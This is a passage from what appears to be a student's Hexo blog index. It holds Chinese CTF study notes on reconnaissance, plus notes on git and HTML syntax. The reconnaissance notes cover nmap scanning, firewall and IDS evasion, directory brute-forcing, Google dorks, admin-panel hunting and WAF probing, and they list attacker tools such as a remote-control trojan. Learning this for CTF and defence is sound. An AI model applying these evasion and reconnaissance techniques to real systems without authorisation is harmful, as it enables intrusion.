          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集下</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8B/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集下"><a href="#信息收集下" class="headerlink" title="信息收集下"></a>信息收集下</h1><h2 id="操作方向"><a href="#操作方向" class="headerlink" title="操作方向"></a>操作方向</h2><ol><li>域名信息</li><li>whois信息</li><li>目录信息</li><li>谷歌hacker</li><li>整站分析</li><li>旁站c端</li><li>后台查找</li><li>cdn绕过</li><li>app</li><li>host.txt<h2 id="自动跑漏洞工具"><a href="#自动跑漏洞工具" class="headerlink" title="自动跑漏洞工具"></a>自动跑漏洞工具</h2><h3 id="Nmap端口扫描王"><a href="#Nmap端口扫描王" class="headerlink" title="Nmap端口扫描王"></a>Nmap端口扫描王</h3><h4 id="主机探测（看哪些主机IP在线）（up-down）"><a href="#主机探测（看哪些主机IP在线）（up-down）" class="headerlink" title="主机探测（看哪些主机IP在线）（up/down）"></a>主机探测（看哪些主机IP在线）（up/down）</h4>（以下步骤的前提是切换到nmap的目录下能够找到nmap.exe）</li><li>扫描单个主机 nmap.exe 192.168.1.2</li><li>扫描整个子网 nmap.exe 192.168.1.1/24</li><li>扫描多个目标 nmap.exe IP1 IP2</li><li>扫描一个范围内的目标 nmap.exe 192.168.1.1-100(扫描1到100的所有主机)<h4 id="查看扫描的所有主机的列表（加参数-sL）"><a href="#查看扫描的所有主机的列表（加参数-sL）" class="headerlink" title="查看扫描的所有主机的列表（加参数-sL）"></a>查看扫描的所有主机的列表（加参数-sL）</h4></li><li>nmap -sL 192.168.1.1/24<h4 id="扫描除过某一个IP外的所有子网主机"><a href="#扫描除过某一个IP外的所有子网主机" class="headerlink" title="扫描除过某一个IP外的所有子网主机"></a>扫描除过某一个IP外的所有子网主机</h4></li><li>nmapxxx-excludexx****</li><li>include和exclude<h4 id="扫描除过某一个文件中的IP外的子网主机命令"><a href="#扫描除过某一个文件中的IP外的子网主机命令" class="headerlink" title="扫描除过某一个文件中的IP外的子网主机命令"></a>扫描除过某一个文件中的IP外的子网主机命令</h4></li><li>nmapxxx-excludefilexxx.txt(会先读取xxx.file中的IP，然后排除)<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3></li><li>nmap -F -sT -v IP</li><li>-F:扫描100个最有可能开放的端口</li><li>-v 获取扫描的信息</li><li>-sT:采用的是TCP扫描，不写也可，默认为TCP扫描</li><li>-p指定扫描的端口<h3 id="zenmap是可视化界面"><a href="#zenmap是可视化界面" class="headerlink" title="zenmap是可视化界面"></a>zenmap是可视化界面</h3></li><li>可以直接输入域名进行扫描<h2 id="端口扫描状态"><a href="#端口扫描状态" class="headerlink" title="端口扫描状态"></a>端口扫描状态</h2></li><li>open 端口开启，数据有到达主机，有程序在端口上监控</li><li>closed 端口关闭，数据有到达主机，没有程序在端口上监控</li><li>filtered 数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤</li><li>unfiltered 数据有到达主机，但是不能识别端口的当前状态</li><li><img src="D:\CTF学习工具\QQ截图.png"><h2 id="服务版本扫描"><a href="#服务版本扫描" class="headerlink" title="服务版本扫描"></a>服务版本扫描</h2><h2 id="主机系统的指纹识别"><a href="#主机系统的指纹识别" class="headerlink" title="主机系统的指纹识别"></a>主机系统的指纹识别</h2><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h2 id="创建扫描版本"><a href="#创建扫描版本" class="headerlink" title="创建扫描版本"></a>创建扫描版本</h2><h2 id="burpsuite手工测"><a href="#burpsuite手工测" class="headerlink" title="burpsuite手工测"></a>burpsuite手工测</h2><h2 id="TCP扫描三次握手-sT-s表明扫描方式，T表明是TCP"><a href="#TCP扫描三次握手-sT-s表明扫描方式，T表明是TCP" class="headerlink" title="TCP扫描三次握手 -sT(s表明扫描方式，T表明是TCP)"></a>TCP扫描三次握手 -sT(s表明扫描方式，T表明是TCP)</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3></li><li>客户端向服务端发送请求</li><li>服务端向客户端发送响应包</li><li>客户端向服务端发送确认相应包</li><li>如果客户端已知不发送，服务端会等待（看服务端的设置状态，例如：等待n秒）<h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3></li><li>当黑客手里握着的主机同时向服务端发送请求时，如果超过服务器能够承受的量，且黑客一直在第三次握手的时候不发送确认包，则会令服务端一直等待，严重的导致拒绝服务<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3></li><li>扫描速度快，准确性高，对操作者没有权限上的要求</li><li>但是容易被防火墙和IDS防入侵系统发现<h2 id="SYN扫描-sS（s表明扫描方式-S表明SYN扫描）"><a href="#SYN扫描-sS（s表明扫描方式-S表明SYN扫描）" class="headerlink" title="SYN扫描 -sS（s表明扫描方式,S表明SYN扫描）"></a>SYN扫描 -sS（s表明扫描方式,S表明SYN扫描）</h2></li><li>秘密的扫描方式</li><li>Client和Server之间没有形成三次握手，所以没有简历一个正常的TCP链接</li><li>不会被防火墙和日志所记录，一般不会在目标主机上留下任何痕迹，但是这种扫描需要root权限<h2 id="使用UDP-ping探测主机"><a href="#使用UDP-ping探测主机" class="headerlink" title="使用UDP ping探测主机"></a>使用UDP ping探测主机</h2>nmap -PU xxx<h2 id="服务器版本探测"><a href="#服务器版本探测" class="headerlink" title="服务器版本探测"></a>服务器版本探测</h2>nmap -sV xxx</li><li>服务器版本即服务器系统的版本<h2 id="精确地确认端口上运行的服务"><a href="#精确地确认端口上运行的服务" class="headerlink" title="精确地确认端口上运行的服务"></a>精确地确认端口上运行的服务</h2>nmap -sV –script unusual-port xxx<h2 id="探测目标主机的操作系统"><a href="#探测目标主机的操作系统" class="headerlink" title="探测目标主机的操作系统"></a>探测目标主机的操作系统</h2></li><li>nmap -O xxx</li><li>nmap -A xxx</li><li>-oN 导出扫描结果</li><li>-oX 导出扫描结果xml格式  </li><li>nmap -A xxx -oX c:\123.xml<h2 id="防火墙躲避绕过"><a href="#防火墙躲避绕过" class="headerlink" title="防火墙躲避绕过"></a>防火墙躲避绕过</h2></li><li>-f 分片绕过</li><li>-D 使用诱饵隐蔽扫描： nmap -D 1.1.1.1,222.222.222.222 xxx</li><li>–source-port 源端口欺骗<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1></li><li>syn扫描器</li><li>扫描外围主机网段</li><li>对应端口爆破工具</li><li>提供访问木马服务器下载的工具</li><li>一个远控<h1 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h1></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
          <category> 定义 </category>
          
          <category> IP </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 定义 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名信息</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8A/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="IP概念"><a href="#IP概念" class="headerlink" title="IP概念"></a>IP概念</h1><ol><li>网络地址：可以用来识别设备所在的网络，网络地址位于IP地址的前端，企业申请IP地址时，获得的不是IP地址，而是唯一的能够识别的网络地址</li><li>主机地址：位于IP地址的后段，可以用来是被网络上的设备，同一网络上的设备都会有相同的网络地址，而各台设备之间通过主机地址来区别<h1 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h1></li><li>版本（4）：IPV6协议版本，其值为6，负责向处理机所运行的IP软件指名此IP数据是IPV6版本</li><li>优先级（4）</li><li>流标号（24）<h1 id="对应IP收集"><a href="#对应IP收集" class="headerlink" title="对应IP收集"></a>对应IP收集</h1></li><li>ping 域名：可以初步获取该地址的服务器相关信息</li><li>相关域名对应IP,相关工具：nslookup：nslookup endl 地址<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><a href="http://www.baidu.com/">www.baidu.com</a></li><li>www.或bbs.为主机名，是主机头</li><li>baidu.com为主域名</li><li>bbs.baidu.com或edu.baidu.com为该主域名下的子域名</li><li>子域名的防御性没有主域名高，子域名可能跟主域名在一个服务器上，通过子域名也可以渗透到主域名</li><li>根据主站点来查找:site.baidu.com</li><li>使用layer子域名挖掘机：输入域名，端口，选择暴力枚举还是解析接口</li><li>可以发现多个域名用一个IP<h1 id="whois-注册人-信息查询"><a href="#whois-注册人-信息查询" class="headerlink" title="whois(注册人)信息查询"></a>whois(注册人)信息查询</h1></li><li>根据已知域名反查，分析出此域名的注册人，邮箱。电话</li><li>工具：爱站网，输入域名后点击whois查询<h1 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h1>目的：搜集信息</li><li>扫robots.txt，其中定义了哪些页面不允许爬行（定义的都是一些敏感的）</li><li>安装包（backup）:<a href="http://www.root.rar/zip;beifen.rar/zip;tar.gz">www.root.rar/zip;beifen.rar/zip;tar.gz</a></li><li>上传目录:ewebedit;ckfinder</li><li>mysql:phpmyadmin:pmd/pma/phadmin</li><li>phpinfo</li><li>编辑器</li><li>iis短文件<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li><li>字典爆破：御剑：输入域名之后直接开始扫目录</li><li>蜘蛛爬行：菜刀：开spider（蜘蛛爬取），输入域名之后开始爬取（菜刀是轻量级的，所有扫出来的结果将放到桌面）<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="记得查常用端口"><a href="#记得查常用端口" class="headerlink" title="记得查常用端口"></a>记得查常用端口</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h2 id="portscan-收录在CTFtools中"><a href="#portscan-收录在CTFtools中" class="headerlink" title="portscan(收录在CTFtools中)"></a>portscan(收录在CTFtools中)</h2></li><li>输入起止IP</li><li>设置端口</li><li>点击start<h2 id="ntscan"><a href="#ntscan" class="headerlink" title="ntscan"></a>ntscan</h2><h2 id="telnet-是Windows自带的链接端口的工具"><a href="#telnet-是Windows自带的链接端口的工具" class="headerlink" title="telnet(是Windows自带的链接端口的工具)"></a>telnet(是Windows自带的链接端口的工具)</h2></li><li>格式：telnet 域名 端口（telnet <a href="http://qufutuan.com/">http://qufutuan.com</a> 3306）<h1 id="旁站c站"><a href="#旁站c站" class="headerlink" title="旁站c站"></a>旁站c站</h1><h1 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2></li><li>windows/linux<h2 id="脚本格式"><a href="#脚本格式" class="headerlink" title="脚本格式"></a>脚本格式</h2></li><li>asp aspx php jsp<h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2></li><li>access</li><li>sqlserver</li><li>oracle</li><li>db2</li><li>postgresql</li><li>sqlite<h2 id="防护情况waf"><a href="#防护情况waf" class="headerlink" title="防护情况waf"></a>防护情况waf</h2></li><li>web application firewall<h2 id="cms类型"><a href="#cms类型" class="headerlink" title="cms类型"></a>cms类型</h2></li><li>dedecms</li><li>diguo</li><li>meterinfo</li><li>dz<h2 id="获取cms"><a href="#获取cms" class="headerlink" title="获取cms"></a>获取cms</h2></li><li>使用yunsee输入域名后查询：web指纹，语言，数据库，容器，服务器IP，操作系统<h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><h3 id="判断是什么脚本"><a href="#判断是什么脚本" class="headerlink" title="判断是什么脚本"></a>判断是什么脚本</h3></li><li>/index.php若正常则为php脚本</li><li>/index.asp若正常则为asp脚本</li><li>/index.asps若正常则为aspx脚本</li><li>/index.jsp若正常则为jsp脚本<h3 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h3></li><li>windows不区分大小写，Linux区分大小写</li><li>输入/index.phP(即修改一个字母)若正常则为windows，不正常则为linux（当php脚本存在时）</li><li>注意区分脚本类型<h3 id="测waf"><a href="#测waf" class="headerlink" title="测waf"></a>测waf</h3></li><li>输入and 1=1</li><li>waf会拦截and这一类的参数<h1 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h1></li><li>intext:查找网页中含有xx关键字的网站（intext: 管理员登录）</li><li>intitle:查找某个标题（intitle: 后台登录）</li><li>Filetype：查找某个文件类型的文件(数据挖掘 filetype: doc)</li><li>inurl:查找url中带有某字段的网站（inurl: php?id=）</li><li>Site:在某域名中查找信息<h1 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h1><h1 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h1><h2 id="弱口令默认后台"><a href="#弱口令默认后台" class="headerlink" title="弱口令默认后台"></a>弱口令默认后台</h2></li><li>admin,admin/login.asp,manage,login.asp<h2 id="查看网页的链接（超链接）"><a href="#查看网页的链接（超链接）" class="headerlink" title="查看网页的链接（超链接）"></a>查看网页的链接（超链接）</h2></li><li>一般来说，网页的主页有管理登录类似的东西，有些可能被管理员删掉</li><li>选择图片等获取链接，从中截取前半部分关于后台的链接，看看是否能访问<h2 id="查看网站使用的管理系统，从而确定后台"><a href="#查看网站使用的管理系统，从而确定后台" class="headerlink" title="查看网站使用的管理系统，从而确定后台"></a>查看网站使用的管理系统，从而确定后台</h2><h2 id="使用工具查找"><a href="#使用工具查找" class="headerlink" title="使用工具查找"></a>使用工具查找</h2></li><li>御剑</li><li>蜘蛛（菜刀）<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2></li><li>robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看<h2 id="googlehacker"><a href="#googlehacker" class="headerlink" title="googlehacker"></a>googlehacker</h2><h2 id="短文件利用"><a href="#短文件利用" class="headerlink" title="短文件利用"></a>短文件利用</h2></li><li>如果有administrator121321312.asp,那么可以直接输入/a<del>!.asp(开头char加</del>加！加文件类型)<h1 id="CDN绕过方法（信息收集上最后）"><a href="#CDN绕过方法（信息收集上最后）" class="headerlink" title="CDN绕过方法（信息收集上最后）"></a>CDN绕过方法（信息收集上最后）</h1><h2 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h2></li><li>内容分发网络（访问加速）</li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
          <category> 定义 </category>
          
          <category> IP </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> 定义 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/git/"/>
      <url>/git/</url>
      
        <content type="html"><![CDATA[<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><h2 id="将历史版本代码用树的形式来整合利用"><a href="#将历史版本代码用树的形式来整合利用" class="headerlink" title="将历史版本代码用树的形式来整合利用"></a>将历史版本代码用树的形式来整合利用</h2><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol><li>工作区：仓库的目录</li><li>暂存区：数据暂时存放的区域，类似于工作区写入版本库前的缓存区，暂存区是独立于各个分支的</li><li>版本库：存放所有已经提交到本地仓库的代码版本</li><li>版本结构：树结构，树中每个节点代表一个代码版本<h2 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h2></li><li>git config –global user.name xxx:设置全局用户名，信息将记录在~/.gitconfig文件中</li><li>git config –global user.email <a href="mailto:&#x78;&#x78;&#120;&#64;&#x78;&#120;&#120;&#46;&#x63;&#x6f;&#x6d;">&#x78;&#x78;&#120;&#64;&#x78;&#120;&#120;&#46;&#x63;&#x6f;&#x6d;</a>:设置全局邮箱地址，信息将记录在~/.gitconfig文件中</li><li>git init：将当前目录配置成git仓库，信息将记录在隐藏的.git文件夹中</li><li>git add xxx:将xxx文件添加到暂存区</li><li>git add .:将所有待加入暂存区的文件加入暂存区</li><li>git rm –catched xx:将文件从仓库索引目录中删掉</li><li>git log :查看xx当前分支中的所有版本 </li><li>git reflog : 查看HEAD指针的移动历史</li><li>git reset –hard HEAD^或git reset –hard HEAD~：将代码库回滚到上个版本</li><li>git reset –hard HEAD^^回滚两次，以此类推</li><li>git reset –hard HEAD~num:回滚num次</li><li>git reset –hard 版本号：回滚到某一特定版本</li><li>git checkout - XX 或 git restore XX :将XX文件尚未加入暂存区的修改全部撤销</li><li>git remote add origin <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#46;&#x61;&#99;&#119;&#105;&#110;&#x67;&#x2e;&#99;&#111;&#109;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#46;&#x61;&#99;&#119;&#105;&#110;&#x67;&#x2e;&#99;&#111;&#109;</a>:…将本地仓库关联到远程仓库</li><li>git push -u:将当前分支推送到远程仓库（第一次需要0u，以后不需要）</li><li>git push origin branch_name:将本地的某个分支推送到远程仓库</li><li>git clone <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#x69;&#116;&#46;&#97;&#99;&#x77;&#105;&#110;&#103;&#x2e;&#x63;&#x6f;&#x6d;">&#x67;&#x69;&#x74;&#64;&#x67;&#x69;&#116;&#46;&#97;&#99;&#x77;&#105;&#110;&#103;&#x2e;&#x63;&#x6f;&#x6d;</a>:…将远程仓库xxx下载到当前目录下</li><li></li></ol><h1 id="节点只负责存储版本，注意区分暂存区和工作区"><a href="#节点只负责存储版本，注意区分暂存区和工作区" class="headerlink" title="节点只负责存储版本，注意区分暂存区和工作区"></a>节点只负责存储版本，注意区分暂存区和工作区</h1><ol><li>git restore xxx:将工作区的文件回滚到暂存区版本</li><li>git restore –staged xxx:将暂存区的版本回滚到库中版本</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML语法规范</title>
      <link href="/HTML%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/"/>
      <url>/HTML%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<span class="label label-info">info</span><h2 id="XHTML的出现是为了过渡到xml"><a href="#XHTML的出现是为了过渡到xml" class="headerlink" title="XHTML的出现是为了过渡到xml"></a>XHTML的出现是为了过渡到xml</h2><h2 id="HTML中不区分大小写，但是我们一般都使用小写"><a href="#HTML中不区分大小写，但是我们一般都使用小写" class="headerlink" title="HTML中不区分大小写，但是我们一般都使用小写"></a>HTML中不区分大小写，但是我们一般都使用小写</h2><h2 id="HTML的注释不能嵌套（就和c-中的if-else一样）"><a href="#HTML的注释不能嵌套（就和c-中的if-else一样）" class="headerlink" title="HTML的注释不能嵌套（就和c++中的if-else一样）"></a>HTML的注释不能嵌套（就和c++中的if-else一样）</h2><h2 id="HTML标签必须结构完整，要么成对出现，要么自结束标签"><a href="#HTML标签必须结构完整，要么成对出现，要么自结束标签" class="headerlink" title="HTML标签必须结构完整，要么成对出现，要么自结束标签"></a>HTML标签必须结构完整，要么成对出现，要么自结束标签</h2><ol><li>浏览器会尽最大努力正确解析页面，不符合语法规范的内容，浏览器会自动修正</li><li>但是有些情况会修正错误<h1 id="F12会跳出开发者控制台"><a href="#F12会跳出开发者控制台" class="headerlink" title="F12会跳出开发者控制台"></a>F12会跳出开发者控制台</h1><h2 id="自结束标签："><a href="#自结束标签：" class="headerlink" title="自结束标签："></a>自结束标签：</h2></li><li>html5中&lt; br &gt;</li><li>xhtml中&lt; br /&gt;(最后有反斜杠)<h2 id="HTML标签可以嵌套，但是不能交叉嵌套"><a href="#HTML标签可以嵌套，但是不能交叉嵌套" class="headerlink" title="HTML标签可以嵌套，但是不能交叉嵌套"></a>HTML标签可以嵌套，但是不能交叉嵌套</h2><h2 id="HTML标签中的属性必须有值，且值必须加引号"><a href="#HTML标签中的属性必须有值，且值必须加引号" class="headerlink" title="HTML标签中的属性必须有值，且值必须加引号"></a>HTML标签中的属性必须有值，且值必须加引号</h2></li><li>&lt; font color=”red” &gt;</li><li>单双引号均可</li></ol><h1 id="live-server快捷键"><a href="#live-server快捷键" class="headerlink" title="live-server快捷键"></a>live-server快捷键</h1><ol><li>写标签的名字后按tab键补全</li><li>写开始标签，回车自动补全</li><li>ctrl+/，自动生成注释标签</li></ol><h1 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><ol><li>HTML中元素指的是从开始标签到结束标签的所有代码，或者开放标签和闭合标签</li></ol><h1 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h1><ol><li>在网页中，编写的多个空格，会被浏览器自动解析为一个空格</li><li>在html中我们不能直接书写一些特殊符号，比如连续多个空格，比如字母两侧的大于和小于号</li><li>如果我们需要在网页中书写这些符号，需要使用html中的实体（转义字符）</li><li>实体的语法<pre class="line-numbers language-none"><code class="language-none">&amp;实体的名字;    &amp;nbsp;空格    &gt;大于号    &lt;小于号    &amp;copy;版权符号&amp;开头;结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h1><pre class="line-numbers language-none"><code class="language-none">定义：the html &lt;meta&gt; represents metadata that cannot be represented by other html meta related elements,like &lt;base&gt;,&lt;link&gt;,&lt;script&gt;,&lt;style&gt;,&lt;title&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="可以提供页面元信息"><a href="#可以提供页面元信息" class="headerlink" title="可以提供页面元信息"></a>可以提供页面元信息</h2><pre class="line-numbers language-none"><code class="language-none">元信息是指描述自身的信息，元信息类标签是指html中用于描述文档自身的一类标签通常出现在head标签中，提供给浏览器或者搜索引擎阅读的，一般不会显示给用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="meta标签永远位于head元素内部"><a href="#meta标签永远位于head元素内部" class="headerlink" title="meta标签永远位于head元素内部"></a>meta标签永远位于head元素内部</h2><h2 id="属性："><a href="#属性：" class="headerlink" title="属性："></a>属性：</h2><pre class="line-numbers language-none"><code class="language-none">content指定的数据内容    charset: 指定网页的字符集    name: 指定数据的名称    content： 指定数据的内容    keywords: 表示网站的关键字    description: 用于指定网站的描述,显示在搜索引擎中的搜索结果中title标签的内容会作为搜索结果的超链接上的文字显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/11/ZpA93mTEXU82Yr4.png"></p><h3 id="必须"><a href="#必须" class="headerlink" title="必须"></a>必须</h3><ol><li>content:定义与http-equiv或name属性相关的元信息（使用，进行分割）<h3 id="可选："><a href="#可选：" class="headerlink" title="可选："></a>可选：</h3></li><li>http-equiv:把content属性关联到HTTP头部</li><li>name:把content属性关联到一个名称– name和content是一对关键字</li><li>scheme:定义用于翻译content属性值的格式</li><li>description:<img src="https://s2.loli.net/2022/05/11/QjIFcrkgbGBCHPO.png"></li></ol><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><ol><li>keywords:为文档定义了一组关键字，某些搜索引擎在遇到这些关键字时会用这些关键字对文档进行分类。&lt; meta name=”keywords” content=”HTML,ASP,PHP” /&gt;(会将HTML等内容进行转keywords操作，content内容使用,进行分割)</li></ol><h3 id="http-equiv"><a href="#http-equiv" class="headerlink" title="http-equiv"></a>http-equiv</h3><pre class="line-numbers language-none"><code class="language-none">用来设置http协议，将一个页面重定向到另一个网站，<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>为名称/值对提供了名称，并指示服务器在发送实际的文档之前先要传送给浏览器的MIME文档头部包含名称值对。</li><li>当服务器向浏览器发送文档时，会先发送许多名称/值对，但是所有的服务器都至少要发送一个。</li><li>使用带有http-equiv属性的meta标签时，服务器将把名称/值对添加到发送给浏览器的内容头部</li><li>&lt; meta http-equiv=”charset” content=”iso-8859-1”&gt;</li><li><img src="https://s2.loli.net/2022/05/11/QNcIihLlHoBgq2U.png"></li><li>其中3表示时间，url表示往哪跳转，重定向到哪.之间用什么间隔<h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3></li><li>提供了名称/值对中的值，该值可以是任何有效的字符串</li><li>content属性始终要和name属性或http-equiv属性一起使用<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2></li><li>&lt; meta http-equiv=”Refresh” content=”间隔时间；url=跳转页面的url”&gt;</li></ol><h1 id="常用的标签："><a href="#常用的标签：" class="headerlink" title="常用的标签："></a>常用的标签：</h1><h2 id="二者之间的关系"><a href="#二者之间的关系" class="headerlink" title="二者之间的关系"></a>二者之间的关系</h2><ol><li>一般情况下会在块元素中放行内元素</li><li>而不会在行内元素中放块元素</li><li>块元素中一般什么都能放</li><li>但是尤其注意：p元素中不能放任何的块元素<br><img src="https://s2.loli.net/2022/05/12/QuWLGEeUR6FXwmc.png"><br><img src="https://s2.loli.net/2022/05/12/HaYZM1bfSoLrFQJ.png"></li></ol><h2 id="在页面中独占一行的元素称为块元素block-element"><a href="#在页面中独占一行的元素称为块元素block-element" class="headerlink" title="在页面中独占一行的元素称为块元素block element"></a>在页面中独占一行的元素称为块元素block element</h2><ol><li>在页面中一般通过块元素来对页面进行宏观布局</li><li><img src="https://s2.loli.net/2022/05/12/96Cd5z1Z2fqwMFv.png"><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3></li><li>HTML中一共有六级标签：h1~h6</li><li>h1最大，为一级；h6为最小，为6级</li><li>一般不用，主要是css来修改</li><li>使用HTML标签时，关心的是标签的语义，我们使用的标签都是语义化标签</li><li>6级标签中，h1最重要，表示一个网页中的主要内容，h2~h6的重要性一次降低</li><li>搜索引擎先搜素title标签，然后就会搜索标题标签，从h1到h6</li></ol><h4 id="对于搜索引擎来说，h1的重要性仅次于title-搜索引擎检索完title，会立即查看h1中的内容"><a href="#对于搜索引擎来说，h1的重要性仅次于title-搜索引擎检索完title，会立即查看h1中的内容" class="headerlink" title="对于搜索引擎来说，h1的重要性仅次于title,搜索引擎检索完title，会立即查看h1中的内容"></a>对于搜索引擎来说，h1的重要性仅次于title,搜索引擎检索完title，会立即查看h1中的内容</h4><ol><li>h1标签非常重要，会影响页面再搜索引擎中的排名，页面只能写一个h1</li><li>一般页面标题中只使用h1,h2,h3，h3以后的基本不使用<br><img src="https://s2.loli.net/2022/05/11/evhY6jZuxoz3qRH.png"></li></ol><h4 id="lt-hgroup-gt"><a href="#lt-hgroup-gt" class="headerlink" title="&lt; hgroup&gt;"></a>&lt; hgroup&gt;</h4><ol><li>hgroup用来为标题分组，剋将一组相关的标题同时放入到hgroup</li><li>分组的目的是用css单独控制这个组，方便修改样式</li></ol><p><img src="https://s2.loli.net/2022/05/11/Qndbqt1LljZuIz7.png"></p><pre class="line-numbers language-none"><code class="language-none">&lt;hgroup&gt;    &lt;h1&gt;...&lt;&#x2F;h1&gt;    &lt;h2&gt;...&lt;&#x2F;h2&gt;&lt;&#x2F;hgroup&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lt-header-gt-标签"><a href="#lt-header-gt-标签" class="headerlink" title="&lt; header&gt;标签"></a>&lt; header&gt;标签</h4><ol><li>&lt; header&gt;&lt;/ header&gt;<br><img src="https://s2.loli.net/2022/05/13/A3rjc1Gludx48Q7.png"></li><li>定义网页的头部</li><li>可以是网页的某一个部分的头部，所以header标签可以不只有一个</li></ol><h4 id="lt-main-gt"><a href="#lt-main-gt" class="headerlink" title="&lt; main&gt;"></a>&lt; main&gt;</h4><ol><li>网页的主体部分</li><li>和c++main函数一样，一个页面中只能有一个</li></ol><h4 id="lt-footer-gt"><a href="#lt-footer-gt" class="headerlink" title="&lt; footer&gt;"></a>&lt; footer&gt;</h4><ol><li>网页的底部<br><img src="https://s2.loli.net/2022/05/13/9qymkQrbfwnPjig.png"></li><li>可以是网页的某一个部分的底部，所以footer标签不只有一个</li></ol><h4 id="lt-nav-gt"><a href="#lt-nav-gt" class="headerlink" title="&lt; nav&gt;"></a>&lt; nav&gt;</h4><ol><li>表示网页的导航</li><li><img src="https://s2.loli.net/2022/05/13/GAeNYhfSF3ksCgH.png"></li><li><img src="https://s2.loli.net/2022/05/14/3yTkS2FtmL5HfAN.png"></li><li>&lt; nav&gt;标签里面放&lt; a&gt;(超链接)<pre class="line-numbers language-none"><code class="language-none">&lt;nav&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt;&lt;nav&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="lt-aside-gt"><a href="#lt-aside-gt" class="headerlink" title="&lt; aside&gt;"></a>&lt; 